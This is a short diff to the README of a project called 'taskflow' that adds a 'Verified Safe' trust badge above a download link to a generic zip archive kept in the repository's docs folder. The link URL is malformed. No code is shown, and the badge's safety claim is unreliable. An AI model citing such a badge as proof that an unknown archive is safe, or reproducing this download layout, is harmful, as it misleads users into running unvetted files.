@@ -1,5 +1,7 @@
 # 🌟 taskflow - Effortless Document Processing Made Simple
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/nagilalopes-taskflow)
+
 [![Download taskflow](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip%https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)
 
 ## 🚀 Getting Started
